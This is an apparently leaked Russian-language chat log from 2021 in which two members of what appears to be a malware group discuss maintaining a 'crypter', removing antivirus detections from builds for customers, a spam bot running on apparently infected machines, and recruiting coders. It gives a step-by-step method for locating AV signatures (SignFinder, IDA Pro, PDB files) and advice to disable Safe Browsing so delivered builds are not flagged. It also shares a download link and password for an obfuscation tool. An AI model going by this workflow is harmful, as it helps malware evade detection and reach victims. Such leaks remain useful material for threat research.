[17.09.21 14:50:01] basil:		наверное лучше тут
[17.09.21 14:50:08] elroy:		да)
[17.09.21 14:50:16] basil:		Да вроде ничего. Там детекты были, почистил
[17.09.21 14:50:27] basil:		generic
[17.09.21 14:50:51] basil:		закинул в ветку develop_payload_generic
[17.09.21 14:51:00] basil:		в beta_* не вливал
[17.09.21 14:51:03] basil:		пока
[17.09.21 14:51:33] basil:		Заказчик , как я говорил, связался по поводу спам-бота/
[17.09.21 14:51:59] basil:		Я нашим админам передал, но они как обычно тянут кота за изветсное место
[17.09.21 14:52:50] elroy:		> закинул в ветку develop_payload_generic
Если работает, имеет смысл потестить да влить.
[17.09.21 14:53:15] basil:		работает. ДАешь добро - вливаю
[17.09.21 14:53:36] elroy:		Но вот только чистить же надо не generic именно, а develop, его вливать в generic и куда дальше
[17.09.21 14:54:12] basil:		ну могу , в принципе и там сделать изменения. Там не много
[17.09.21 14:55:05] elroy:		Я в develop последний раз слил изменения твои по запуску без crt, где все переделано, но есть crt и не используются векторы.
[17.09.21 14:55:16] elroy:		Этот коммит делает илды по 8 бегабайт
[17.09.21 14:55:46] elroy:		Так вот, сделай ветку на основе ветки 2022 студии.
[17.09.21 14:55:55] elroy:		Она на основе develop
[17.09.21 14:56:13] elroy:		Вот эту новую ветку почисти и разлей дальше
[17.09.21 14:56:47] basil:		хорошо. как скажешь. 2022 я поставил. Наврное говорил уже
[17.09.21 14:57:10] elroy:		*она на основе коммита самого свежего рабочего develop, до того как я слил туда обнову без векторов.
[17.09.21 14:57:30] elroy:		Там должно работать и без 2022, просто ветка свежая)
[17.09.21 14:57:34] elroy:		Ок)
[17.09.21 14:57:43] basil:		хорошо. не проблема.
[17.09.21 14:58:05] basil:		единственная проблема на текущий момент это с ШК , который manuel дал. Крашится и все. Пока в процессе
[17.09.21 14:58:30] basil:		Обещал дать исходники ШК, а прислал бинарники
[17.09.21 14:58:48] elroy:		Я проверял, шк работатет. Это косяк 2022 студии наверное
[17.09.21 14:58:52] elroy:		Где-то там проблема
[17.09.21 14:59:04] basil:		У тебя заработал?
[17.09.21 14:59:27] elroy:		Т.е. проблема не в том, что не работает шк как таковой, а в том, что тот шк, который дает мануэль, не работате на билдах 2022
[17.09.21 14:59:40] basil:		да?
[17.09.21 14:59:45] elroy:		Проверь)
[17.09.21 14:59:50] elroy:		Я же скидывал тестовый шк
[17.09.21 15:00:06] basil:		ну тестовый и у меня работал
[17.09.21 15:00:18] elroy:		Ну больше ничгео сделать нельзся
[17.09.21 15:00:29] elroy:		Разве что где-то по размеру оригинальный режется
[17.09.21 15:00:47] elroy:		Ну просто можешь пройтись отладчиком на удаленной машине, посмотреть на каком месте падает
[17.09.21 15:00:58] elroy:		Если после запуска, то мы безсильны тут
[17.09.21 15:01:05] elroy:		Надо глубоко исследовать что там не так
[17.09.21 15:01:18] elroy:		Просто делать его тогда на основе 2019 студии
[17.09.21 15:02:38] basil:		да я вот тоже так думал, что скорее всего с шк что-то не так. Но побоялся озвучить свою точку зрения
[17.09.21 15:03:07] basil:		хотя чейчас посмолтрю насчет размера
[17.09.21 15:03:12] elroy:		А ты не бойся ее озвучивать, это рабочий процесс. А вдруг она верная была....
[17.09.21 15:03:58] basil:		хорошо))) Тогда берегитесь господа. Я к сожалению очень едкий критик
[17.09.21 15:04:56] elroy:		А ты едко и толлерантно (и обоснованно), это прекрасное качество))
[17.09.21 15:05:44] basil:		попробуем...Так сказать, будем качать "софт-скилс" , как сейчас модно говорить
[17.09.21 15:06:16] elroy:		Какие из языков программирования ты еще знаешь?
[17.09.21 15:08:13] basil:		Слушай, вот вопрос. Без обид только... У меня такое чувство , что я с каким-то другим человеком разговариваю. У меня была опечатка в выражении "сделай вдох". Какая?
[17.09.21 15:08:36] elroy:		Ахаха))
[17.09.21 15:08:39] elroy:		Нет, не с другим
[17.09.21 15:08:45] elroy:		"Сделай вход"
[17.09.21 15:08:53] basil:		Все. Ок
[17.09.21 15:09:02] basil:		может отпуск на тебя подействовал так
[17.09.21 15:09:05] basil:		)))
[17.09.21 15:09:19] elroy:		Насчет жабера, ты там так написал просто, как frances пишет. Я на ник не посмотрел)))
[17.09.21 15:09:34] basil:		Хорошо. Все нормально
[17.09.21 15:13:05] basil:		Ну если говорить о тех которые я более - менее знаю. То это ассемблер (ARM, x86), си (всякие его диалекты, типа под контроллеры), pascal (он же Delphi. Фу-фу кака...), java. Ну и очень люблю реверс всякий. Ну по крайней мере в контору к касперу я собеседование и ТЗ прошел, но они очень жадные...
[17.09.21 15:15:47] basil:		mips ассемблер еще был. Но совсем чуть-чуть
[17.09.21 15:19:22] elroy:		А почему жадные?) Сколько они там предложили?
[17.09.21 15:19:32] elroy:		Доступ в бассей не предлагали?)
[17.09.21 15:20:35] basil:		Ну предлагали 85. Так дело было. Плюс раньше у них была программа релокации, но очень хреновая, а сейчас ее точно отменили
[17.09.21 15:20:48] basil:		ну по последним слухам. Может я не прав
[17.09.21 15:21:20] elroy:		Ужс, так мало)
[17.09.21 15:21:36] basil:		ну а хотелок там хоть отбавляй
[17.09.21 15:21:43] elroy:		К нам приходят 2к мало, ищут 5 кодеры...
[17.09.21 15:22:44] basil:		ну не знаю..... Все эти собеседования - раз на раз не приходится. То что возвращает printf , то спроектируйте на c++ кухню
[17.09.21 15:22:50] basil:		))
[17.09.21 15:23:38] basil:		ТО говорят напишите программу, мы хотим посмотреть как вы пишите.... Ну а потом .... Дескать вы не использовали такую библиотеку- поэтому не считаетсч
[17.09.21 15:23:47] elroy:		-- о что возвращает printf , то спроектируйте на c++ кухню
-- ага, т.е. на кухне продолжить, да? с печньками?)
[17.09.21 15:24:13] elroy:		Ладно)
[17.09.21 15:24:18] elroy:		Я не просто спросил
[17.09.21 15:25:15] elroy:		Сейчас новых кодеров набирают, требования такие:
Обязательно: знание одного из языков C#, Go, PowerShell, Python, Nim, Rust
[17.09.21 15:25:31] basil:		это под крипту
[17.09.21 15:25:33] basil:		?
[17.09.21 15:25:46] elroy:		Это у нас...
[17.09.21 15:25:57] basil:		да можно
[17.09.21 15:26:05] basil:		и только это осваивал
[17.09.21 15:26:50] basil:		Ну вас. УУ программистов... Одна проблема - технологии очень пестрые
[17.09.21 15:27:12] elroy:		Знаю точно, что не стоит от них отставать. Выдели время на любой) silver тдает предпочтение C# + powershell
[17.09.21 15:27:31] basil:		ок. хорошо
[17.09.21 15:28:00] elroy:		Насчет delphi, сам когда-то давно на нем писал. Вполне юзабилен))
[17.09.21 15:28:12] elroy:		Криптер на нем потянешь?)
[17.09.21 15:28:25] basil:		можно
[17.09.21 15:28:29] basil:		я так думаю
[17.09.21 15:28:52] basil:		у меня проблема только в загрузчике будет
[17.09.21 15:29:04] basil:		dll загрузчик думаю реализую
[17.09.21 15:29:19] basil:		но вот exe....
[17.09.21 15:29:43] elroy:		Так там все на винапи ведь
[17.09.21 15:30:11] basil:		ну если несмножко содрать с нашего криптера тогда думаю да
[17.09.21 15:30:30] elroy:		Меня делфи беспокоит своей стандартной библиотекой, он ее пихает всю, весь юнит, не зависимо от того, используешь частично или все в нем. Там размер велик будет
[17.09.21 15:30:48] elroy:		+ возможно нечетки хеши из-за этого будут близки
[17.09.21 15:31:02] basil:		Да. Плюс..... Ну у паскаля синтаксис все-таки громоздкий
[17.09.21 15:32:09] basil:		Если верить крису касперси , не путать с женей касперским. ТО там чуть ли не своя ОС внутри стоит. Читал "искусство дизассемблирования"?
[17.09.21 15:32:47] elroy:		Не читал, не попадалась)
[17.09.21 15:33:04] basil:		интерсная книжка
[17.09.21 15:33:07] basil:		Кстати говоря
[17.09.21 15:33:22] elroy:		Еще можно на freepascal посмотреть, весьма интересен
[17.09.21 15:33:33] elroy:		Да, надо бы почитать)
[17.09.21 15:33:45] elroy:		Библиотеку собираю, но читать некогда))
[17.09.21 15:34:06] basil:		Немного устарела конечно..... Но основные положения интересны
[17.09.21 15:34:26] basil:		Автор погиб несколько лет назад
[17.09.21 15:34:41] elroy:		Жаль..
[17.09.21 15:34:54] elroy:		Обстоятельства не известны?
[17.09.21 15:35:45] basil:		Да нет. Вроде все прозрачно. Переехал в штаты. Решил прыгнуть с парашютом. Призенмлилмся неудачно....
[17.09.21 15:36:13] elroy:		да уж
[17.09.21 15:36:42] basil:		Короче, косу чуждено быть повешенным - тот не утонет
[17.09.21 15:36:49] basil:		кому*
[17.09.21 15:39:00] elroy:		Наверное. Сам в судьбу не верю, надо просто осторожнее..
Все дело в мотивации, но, ведь, как раз, замерзшие альпинисты в горах и люди с парашютами, весьма замотивированные личности. Тут главное палку не перегнуть...
[17.09.21 15:40:42] basil:		Ну у меня тоже "сверхматериалистичное" образование, но последнее время , я с таким удивленим смотрю на этот мир.... Что происходит?
[17.09.21 15:41:34] elroy:		Происходит именно то, что ты и видишь)
[17.09.21 15:42:22] basil:		Ну может быть.... Настивать не буду. Тут может мое личное мнение...
[17.09.21 15:44:13] elroy:		Очевидно, что мир сходит с ума потихоньку
[17.09.21 15:44:28] basil:		во-во-во)))
[17.09.21 15:44:34] basil:		Ничего не понимаю
[17.09.21 15:45:58] elroy:		Пишут, кстати, что ковид влияет на интелект. Те, кто им переболел, в зависимости от степени, потеряли в коэффициенте интеллекта
[17.09.21 15:46:51] basil:		ну я не болел. У меня даже прививка как-то совсем в лайт версии прошла. Плечо день поболело и все
[17.09.21 15:47:06] elroy:		Весьма сильная зараза, видимо. Выкашивает человечество дальше, на фоне того, что человечество достигло (по интеллекту)
[17.09.21 15:48:07] basil:		мне кажется, что нам про нее просто не все говорят
[17.09.21 15:48:14] basil:		есть такое мнение...
[17.09.21 15:49:01] elroy:		Да, мне так тоже показалось
[17.09.21 15:49:12] elroy:		Да и зачем всем говорить правду?)
[17.09.21 15:49:33] basil:		Действительно)))
[17.09.21 15:49:46] basil:		Это наши руководители умеют)))
[17.09.21 15:50:06] basil:		"А вы с какой целью интересуетесь?..."
[17.09.21 15:51:00] elroy:		)))
[17.09.21 15:51:31] elroy:		Всегла читал вторую строку под этой фразой
[17.09.21 15:51:50] basil:		)))
[17.09.21 15:52:39] elroy:		"Вы все равно ничего с этим сделать не сможете, так на кой оно вам?"
[17.09.21 15:53:00] elroy:		третья строка
("Или вам просто не дадут")
[17.09.21 15:54:14] basil:		есть такое. Фраза "А вы с какой целью интересуетесь?..." должна произноситься с направленной в сторну апонента лампой
[17.09.21 15:55:06] elroy:		Ну да) Это четвертая строка))))
"Или все же вы что-то можете!?"
[17.09.21 15:55:50] basil:		))). Да . так именно и предполагалось!
[17.09.21 15:57:57] elroy:		Хороший был диалог)
Я в офф
[17.09.21 15:58:12] basil:		ок. отдыхай! я на посту)))
[29.09.21 12:22:54] elroy:		Приветствую. Как дела?
[29.09.21 12:23:08] basil:		Приветствую
[29.09.21 12:23:15] basil:		Да вроде ничего
[29.09.21 12:23:37] basil:		Заказчик по спам боту активизировался еще на прошлой неделе
[29.09.21 12:24:04] basil:		Теперь работаем по схеме "всю ночь кормить к утру зарезать"
[29.09.21 12:24:38] basil:		на крипт последнее время столо поступать много каких-то битых фалов
[29.09.21 12:24:58] basil:		Т.е. на тестовых криптер отрабатывет , а на нагрузке
[29.09.21 12:25:00] basil:		нет
[29.09.21 12:25:34] basil:		я сейчас набор функций для WinApi отключил, пустая строка всместо них
[29.09.21 12:25:50] basil:		Они только грязным делают криптер
[29.09.21 12:26:15] basil:		Сейчас скинул бинарники заказчику
[29.09.21 12:26:21] basil:		Тестируют сервер
[29.09.21 12:26:32] basil:		Говорит при большой нагрузке сервер падает
[29.09.21 12:26:48] basil:		Но это наверное больше к martin
[29.09.21 12:27:00] basil:		А так живем почуть чуть
[29.09.21 12:27:04] basil:		Как сам?
[29.09.21 12:27:33] elroy:		>  я сейчас набор функций для WinApi отключил, пустая строка всместо них
> Они только грязным делают криптер
Это как так отключил?) Они же там используются
[29.09.21 12:29:04] basil:		Я подразумеваю шумовые функции
[29.09.21 12:29:42] basil:		Тут вот у меня одна проблема выискалась
[29.09.21 12:30:08] basil:		Делаю билды закружаю на файлообменник, ставлю пароль (естественно)
[29.09.21 12:30:26] basil:		Заказчик скачивает файлы и тут же детект
[29.09.21 12:30:32] basil:		На архив!!!!
[29.09.21 12:31:33] elroy:		Нужно выключить Safe browsing и тебе и ему, это из-за этого.
[29.09.21 12:31:56] elroy:		Safe browsing делает базу с исочником происхождения файла
[29.09.21 12:32:25] basil:		да. silver так же сказал
[29.09.21 12:32:32] basil:		Я у него проконсультировался
[29.09.21 12:32:33] elroy:		Когда файл распаковывается и запускается, потом ловится по детекту, то и архив и ссылка помечается вредоносной
[29.09.21 12:33:17] basil:		а в остальном все вроде нормально...
[29.09.21 12:33:30] basil:		Без особых проишесатвий
[29.09.21 12:33:39] basil:		событий*
[29.09.21 12:33:49] basil:		как отдыхается то?
[29.09.21 12:34:00] elroy:		Ок. Я болею, лечусь. Выйду через неделю еще
[29.09.21 12:34:28] basil:		шеф, любимый руководитель!!!!
[29.09.21 12:34:35] basil:		Ты меня расстраиваешт
[29.09.21 12:34:39] elroy:		Обидно, что не знаю даже где и как.. Оно как-то с циклоном пришло. Прошел дождь, свалило дыхание... В атмосфере что-ли какая-то гадость...
[29.09.21 12:34:45] basil:		расстраиваешь, что заболел
[29.09.21 12:35:11] basil:		не корона надеюсь?
[29.09.21 12:35:51] elroy:		Не знаю. Но по состоянию, наверное нет. Или как-то не резкое
[29.09.21 12:36:20] basil:		я себе прививку сделал.
[29.09.21 12:36:28] basil:		как-то поспокойнее
[29.09.21 12:36:47] basil:		Выздоравливай , пожалуйста
[29.09.21 12:36:55] basil:		С работой я справлюсь
[29.09.21 12:37:54] elroy:		Как после прививки состояние?
[29.09.21 12:38:18] basil:		ну у меня ничего. Только день рука поболела чуть-чуть
[29.09.21 12:38:29] basil:		даже не сопливил, ничего
[29.09.21 12:38:32] basil:		совсем
[29.09.21 12:38:39] basil:		Но это у меня....
[29.09.21 12:38:57] basil:		Если ты человек уже не очень молодой - то даже не знаю
[29.09.21 12:39:11] basil:		после 45 могут быть простудные эффекты
[29.09.21 12:39:27] basil:		особенно это после 2 части прививки проявляется
[29.09.21 12:39:54] basil:		ТАк как то среди моих знакомых происходит
[29.09.21 12:41:54] elroy:		Ясно
[30.09.21 11:05:05] elroy:		Приветствую.
[30.09.21 11:05:16] basil:		Приветствую
[30.09.21 11:05:23] elroy:		А ты когда в отпуск? (там в группе писал silver)
[30.09.21 11:05:46] basil:		в конце следующей недели
[30.09.21 11:06:18] elroy:		На сколько?
[30.09.21 11:06:29] basil:		10 дней
[30.09.21 11:06:35] elroy:		ок
[30.09.21 11:06:43] basil:		не удобно?
[30.09.21 11:07:16] elroy:		Не знаю) Удобно) Я сам выйду через неделю только..
[30.09.21 11:08:02] elroy:		Поздравляю с назначением помощника в проект. Давно его нужно было назначить, я давно просил)
[30.09.21 11:08:02] basil:		я честно говоря думал , что ты выйдешь в начале следующецй недели. Но вроде как сказал , что заболел
[30.09.21 11:08:19] basil:		ну ты сказал
[30.09.21 11:08:53] basil:		Слушай. Ты же сейчас онлайн. Но так сказать "инкогнито"
[30.09.21 11:09:12] basil:		Я хотел в группе крипторов поднять один маленткий вопрос
[30.09.21 11:09:25] elroy:		Предполагаю, что выйду 10ого, а там как получится, раньше или позже
[30.09.21 11:09:43] basil:		ну 10 это нормавльно
[30.09.21 11:09:55] basil:		от тебя нужна "технически-политическая" консультая
[30.09.21 11:09:58] elroy:		Поднимай любые вопросы.... подумаем, посмотрим)
[30.09.21 11:10:01] basil:		консультация
[30.09.21 11:10:08] elroy:		Спрашивай
[30.09.21 11:10:20] basil:		сейчас напишу в блокноте
[30.09.21 11:10:31] basil:		и тебе в чат скину. Оценишь
[30.09.21 11:10:44] elroy:		pgp тогда оберни
[30.09.21 11:10:54] basil:		нет))))
[30.09.21 11:11:01] basil:		там не настолько критично
[30.09.21 11:12:02] basil:		Просто очень далеко не уходи)))
[30.09.21 11:12:16] elroy:		ладно
[30.09.21 11:19:53] basil:		На метсе?
[30.09.21 11:20:04] elroy:		да
[30.09.21 11:20:07] basil:		пишу
[30.09.21 11:20:21] basil:		вот как-то так получилось
[30.09.21 11:20:31] basil:		```
Уважаемые коллеги!
Хотелось бы поднять вопрос который волнует , наверное, не только меня. Он касается чистки криптеров от детектов. Опишу кратко свой способ чистки. Берется крипт. Проверяется на dyncheck. Определяется список антивирусов, у которых присутствует детект. Далее берется чистая виртуальная машина. На нее устанавливается АВ и АВ обновляется. У АВ отключается проверка в реальном времени. Далее берется специализированный python скрипт. Я использую такой https://github.com/vxlabinfo/SignFinder. Что он делает... Он дробит файл на блоки, скажем по 40 байт. Потом каждый из этих блоков "зануляет" и создает набор файлов, в каждом из которых "занулен" только один блок. После этого получившиеся файлы подсовываются АВ. В файле который АВ не тронул детект затерт. После происходит сравнение оригинального файла и с "затертым" детектом, с целью определить какую часть файла "затерли". Далее берется оригинальный файл, берется дизассемблер IDA PRo, берется файл pdb, созданный visual studio. После этого можно попытаться локализовать детект в высокоуровневом языке криптера.
У меня лично проблема состоит в том , что всяких АВ развелось очень много. Многие АВ требуют регистрации, на одник ОС они работают на других не работают. Короче , пока сделаешь все это, скачашь АВ, потом выяснишь , что ему требуется какое-то спецефическое окружение, потом выяснишь что ОС его не поддерживает, потом его обновишь, потом поймешь как работает его интерфейс.... Пройдет часа 1,5.  Плюс время проверки очень велико. Есть рационализаторское предложение. Может как-то можно организовать набор виртуальных машин с предустановленными АВ и уже готовыми скриптами, пот типу того который указана выше. Может нам как-то выделить отдельного специалиста, кторый будет заниматься только локализацией детектов.
```
[30.09.21 11:23:41] elroy:		> Пройдет часа 1,5
[30.09.21 11:23:41] elroy:		Оптимист
[30.09.21 11:23:58] basil:		ну я по минимуму беру
[30.09.21 11:24:09] basil:		может и 3 пройти
[30.09.21 11:24:16] basil:		запросто
[30.09.21 11:24:25] elroy:		У меня иногда пара суток уходит.
[30.09.21 11:24:36] basil:		во-во-во
[30.09.21 11:24:57] basil:		а заказчикам как всегда надо срочно
[30.09.21 11:24:59] elroy:		Эта гадость через впн, который через тор, обновляется со скоростью в пару кб
[30.09.21 11:25:26] elroy:		Смотри
[30.09.21 11:25:34] elroy:		Проблема такая есть
[30.09.21 11:25:35] elroy:		да
[30.09.21 11:26:03] elroy:		Но первое что ты сделаешь, это обрушишь на себя гнев silver`а
[30.09.21 11:26:18] elroy:		По трем причинам:
[30.09.21 11:26:29] basil:		вот поэтому и хотел прокончульитроваться
[30.09.21 11:28:53] elroy:		1) используешь для работы скрипт, который почему-то лучше чем утилита, над которой работал он сам (avclean)
2) требуешь лишнего человека + ресурсы, это где-то минимум $3000 / месяц затрат
3) показываешь, что не умеешь организовать свою работу (обновить ав заранее)
Вот если еще все промолчат, то примиш гнев на себя
[30.09.21 11:29:21] elroy:		В общем)
[30.09.21 11:29:28] elroy:		Насчет проблемы
[30.09.21 11:29:35] elroy:		Я поднимал уже
[30.09.21 11:30:23] elroy:		У нас есть облачный avclean, он параллелится на кластер, работает с АВ одновременно на неескольких машинах, собирает результат
[30.09.21 11:30:38] elroy:		Это запланировано на развертывание тогда, когда починят АВ ферму
[30.09.21 11:30:47] elroy:		Прилепим как сервис к панели
[30.09.21 11:31:29] basil:		Спасибо. Я был в шаге от фатальной политической ошибки....
[30.09.21 11:31:43] basil:		Вот хорошо, что провидение сработало
[30.09.21 11:31:53] basil:		прямо пот на лбу вскочил
[30.09.21 11:32:12] basil:		штирлиц никогда не был так близок к провалу
[30.09.21 11:33:37] elroy:		Пока из рекомендаций, запасись набором машин с АВ, тех, которые нужны, обновляй их, делай снимки, обновляй в фоне. VirtualBoч очень удобен в работе, в плане снимков и клонирования машин. Если машина с guest addition, умеет деать живые снимки, т.е. несколько секунд и маишна запущена на нужном снимке
[30.09.21 11:34:51] basil:		хорошо. спасибо за консультацию. Тут просто еще заказчик активизировался по спам-боту. Давай-давай шнель!
[30.09.21 11:35:21] basil:		только все настроил запустил в дизассемблер этот уткнулся и вот он.
[30.09.21 11:35:29] basil:		появился
[30.09.21 11:35:56] basil:		но все равно спасибо. я буквально в шаге был
[30.09.21 11:36:17] elroy:		Да, похоже что был)
[30.09.21 11:36:38] elroy:		Я держу на контроле это проблему, я знаю, сколько на ней у всех времени тратится
[30.09.21 11:37:05] basil:		но изначально хотел конечно как лучше
[30.09.21 11:37:26] basil:		хотели как лучше - получилось как всегда
[30.09.21 11:38:12] basil:		Хорошо. Еще раз спасибо за консультацию
[30.09.21 11:38:32] elroy:		Не беспокойся, все впорядке... Это все равно был бы рабочий момент
[30.09.21 11:38:33] basil:		Я сейчас попробую спам-ботом этим заняться
[30.09.21 11:38:35] elroy:		ок
[30.09.21 11:39:07] basil:		А можно еще один вопрос?
[30.09.21 11:39:16] basil:		последний)))
[30.09.21 11:41:31] elroy:		да
[30.09.21 11:41:45] elroy:		Надеюсь не последний)))
[30.09.21 11:48:23] basil:		ДА там в чате общем как то поднимался вопрос, по поводу дальнейшей цены криптовалюты. ТОгда твой коммент меня очень впечатлил. Слушай, а вообще стоит ли сейчас что-то дерджать в крипте ну с целью дождаться ее роста? Какой вот ИМЕННО ТВОЙ прогноз?
[30.09.21 11:49:14] elroy:		Это сложный вопрос, правда..
[30.09.21 11:49:36] elroy:		Сам держу, много держу, надеюсь на лучшее))
[30.09.21 11:51:04] elroy:		Крипта скользкая и опасная штука. Разная политика государств относительное нее
[30.09.21 11:53:09] basil:		тут еще какой дело в году этак 2017 один товаарищ взял достаточно внушительную сумму в биткоинах. Я просто тогда , скажекм так , "стебался" над ним , дескать "а чем крипта обеспечена?". А он тогда говорил "вот увидишь, биткоин будет за 100.000 $"
[30.09.21 11:53:51] basil:		Как то прогноз его пока не сбылся , но достаточно близок. Тогда точно никто такого не ждал....
[30.09.21 11:54:13] basil:		Вот и тоже сейчас много держу и тоже надеюсь на лучшее...
[30.09.21 11:54:45] elroy:		Я придерживаюсь необычной стратегии
[30.09.21 11:56:15] elroy:		Я вкладывают пару раз в месяц, на протяжении уже пары лет. Так вот, я заметил, что купленная дороже компепнсируется рывками роста купленной ранее.
Вот если порциями класть, то оно относительно общей стоимости как-то выравнивается
[30.09.21 11:56:54] basil:		Да?
[30.09.21 11:57:12] basil:		обычно купи дешевле - продай дороже
[30.09.21 11:59:43] elroy:		Не возможно всегда покупать дешевле) Рано или поздно купишь дороже, потому как через пару дней оно подешивеет. В итоге, за неделю, окажется, что купил дороже. Но надо покупать дальше, оно в этот раз окажется выгоднее, и частично компенсируется, когда подрастет. (в среднем две покупки как-бы стабилизируются)
[30.09.21 12:00:29] elroy:		Но это так, наблюдения. Ты математик, тебе проще. Возми график, сделай выборку, сравни успешность.
[30.09.21 12:00:55] elroy:		За пол года такие маневры компенсируются...
[30.09.21 12:02:24] basil:		пробовал анализом заниматься ...... Классические метематические приемы на рынке - это точно не правильно.... Нет, не работает
[30.09.21 12:02:30] basil:		Надо что-то другое
[30.09.21 12:02:40] basil:		Но все равно спасибо.
[30.09.21 12:02:48] elroy:		Да не за что)
[30.09.21 12:03:23] elroy:		Та стратегия, что я привел, это скорее на сохранение, а не заработок.
[30.09.21 12:03:26] basil:		ок. все. Теперб точно заварачиваюсь. Надо этого спам бота все таки доделать
[30.09.21 12:03:37] elroy:		ок)
[01.10.21 13:59:02] basil:		Приветствую?
[01.10.21 13:59:17] basil:		это было восклицание!
[01.10.21 14:31:01] elroy:		Приветствую
[01.10.21 14:31:33] basil:		Читал группу по спам боту?
[01.10.21 14:31:57] elroy:		Посматриваю
[01.10.21 14:32:58] basil:		как дочитаешь  - сообщи
[01.10.21 14:33:21] elroy:		А что хотел то?)
[01.10.21 14:34:20] basil:		да вот не понятно мне чего лни так трясутся над этими машинами. Какая им то разница 10 запустить или 300?
[01.10.21 14:34:26] basil:		Запустил и запустил
[01.10.21 14:34:35] basil:		Убудет что ли?
[01.10.21 14:34:36] elroy:		Ботов не много
[01.10.21 14:35:02] basil:		это уже зараженные машины?
[01.10.21 14:35:11] elroy:		Возможно
[01.10.21 14:35:16] basil:		хорошо
[01.10.21 14:35:31] basil:		понял. с личные дела не лузу. Молчу молчу
[01.10.21 14:35:42] basil:		Я думал что это ихние виртуалки
[01.10.21 14:35:53] basil:		просто машины подняли да и все
[01.10.21 14:35:55] basil:		ок
[01.10.21 14:35:58] elroy:		Врядли. Это скорее всего боевые боты
[01.10.21 14:37:37] elroy:		Еще хочу дать рекомендацию
[01.10.21 14:37:55] basil:		да
[01.10.21 14:37:58] basil:		слушаю
[01.10.21 14:39:08] elroy:		Вы бы согласовали допустимые символы к передачев джейсон.
И перед предачей надо провалидировать данные, которые передаются. Все иные символы - заменить каким-то одним. Иначе ошибки по формату будут долго собираться.
[01.10.21 14:40:18] basil:		Да. Согласен. У меня эта мысль тоже где-то в бессознательном крутилась....
[01.10.21 14:40:59] elroy:		Данные безусловно лучше разбивать
[01.11.21 11:22:59] basil:		тест
[01.11.21 11:23:08] basil:		включи ОТР
[01.11.21 11:31:30] basil:		ответь. Пожалуйста
[01.11.21 11:32:25] elroy:		отр?
[01.11.21 11:33:16] basil:		сейчас попробую включить
[01.11.21 11:33:33] basil:		тест
[01.11.21 11:33:41] basil:		вот хорошо. повтори
[01.11.21 11:34:02] elroy:		У нас тут был е2е, почему-то сообщений не видно
[01.11.21 11:34:10] elroy:		Давай еще раз е2е
[01.11.21 11:34:15] elroy:		Если нет - то отр
[01.11.21 11:34:42] elroy:		А так?
[01.11.21 11:34:49] basil:		так да
[01.11.21 11:34:54] basil:		но без шифрования
[01.11.21 11:34:58] elroy:		У нас тут был е2е, почему-то сообщений не видно
Давай еще раз е2е
Если нет - то отр
[01.11.21 11:35:08] basil:		это плохо. Давай в другом месте
[01.11.21 11:35:24] elroy:		Проверим
[01.11.21 11:35:30] basil:		Во
[01.11.21 11:35:35] basil:		Работает
[01.11.21 11:35:36] basil:		Ура
[01.11.21 11:35:37] elroy:		е2е
[01.11.21 11:35:37] basil:		!
[01.11.21 11:35:40] elroy:		ок
[01.11.21 11:36:49] basil:		ситуция странная. Сейчас прогнал 4 раза. С глубиной вложения 16. Код такой
```
#include <iostream>
#include <intrin.h>
#include "noise_stub.h"


void test_1()
{

	// <codeobfuscator:begin_function>

	// <codeobfuscator:begin_block>
	printf("test_1_1\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_1_2\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_1_3\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function>

}

void test_2()
{

	// <codeobfuscator:begin_function>

	// <codeobfuscator:begin_block>
	printf("test_2_1\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_2_2\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_2_3\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function>

}



void test_3()
{

	// <codeobfuscator:begin_function>

	// <codeobfuscator:begin_block>
	printf("test_3_1\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_3_2\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_3_3\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function>

}

int main()
{
	test_1();
	test_2();
	test_3();
	std::cout << "Hello World!\n";
}

```
[01.11.21 11:37:02] basil:		все корректно
[01.11.21 11:38:00] basil:		дело или в обфускаторе, который ты вроде как переделал. Или уже в тегах. Можешь сейчас прислать утилиту вот эту с твоими добавлениями
[01.11.21 11:38:19] elroy:		Да, сейчас скину
[01.11.21 11:41:48] elroy:		```
https://file.io/EYePi3yo6WaC
N66D8shXis(saouDyctd5sFstwsaq
```
[01.11.21 12:01:14] basil:		Нет.  у меня,По крайней мере, отрабатывает корректно.
[01.11.21 12:01:41] basil:		Раскажи где последний коммит. И как криптеру привязать эту утилиту
[01.11.21 12:02:49] elroy:		Оно привязано к другому криптеру. Я конечно могу дать, но это тебя на долго погрузит во все это
[01.11.21 12:02:59] elroy:		Сделай провекру просто пошире по условиям
[01.11.21 12:03:18] elroy:		Уверен, что функции после сборки не куда не деваются оптимизатором?
[01.11.21 12:03:25] elroy:		В этом примере
[01.11.21 12:03:40] elroy:		Меняется размер файла если занчение 3 или 18 ?
[01.11.21 12:04:11] basil:		я сейчас и отладочную версию теста запускал. И релизную с оптимизацией
[01.11.21 12:04:19] basil:		сейчас посмотрб насчет размера
[01.11.21 12:05:00] elroy:		По отладочной, поток выполнения иде правильно по всем условиям?
[01.11.21 12:05:22] basil:		да.
[01.11.21 12:05:35] basil:		12 кб и 85 кю соответственно
[01.11.21 12:05:49] elroy:		А если mt делать?
[01.11.21 12:06:03] basil:		сейчас
[01.11.21 12:07:02] elroy:		Я на 32х битном exe пробовал
[01.11.21 12:07:09] elroy:		На том, который в итоге собирается
[01.11.21 12:07:35] elroy:		А кстати генерировал 64х битной версией noiser
[01.11.21 12:07:41] elroy:		Не может быть в этом дело?
[01.11.21 12:07:46] elroy:		Можешь повторить?
[01.11.21 12:08:45] basil:		да. корректно
[01.11.21 12:09:41] basil:		Т.е. обфускатор запустить 32 битный?
[01.11.21 12:09:47] basil:		Не 64 битный
[01.11.21 12:10:08] elroy:		noiser 64, а то что он сгенерирует - 32х битное апп
[01.11.21 12:11:19] basil:		я генеррировал код на 64 битном обфускаторе. А собирал сгенерированный код нав x32/x64 (release/debug)
[01.11.21 12:11:44] basil:		4 варианта для сборки обфусцированного кода проверил
[01.11.21 12:11:50] basil:		единственное
[01.11.21 12:12:06] basil:		я какой-то тег не использовал в тестовом примере
[01.11.21 12:12:11] basil:		сейчас посмотрю какой
[01.11.21 12:13:26] elroy:		shufle
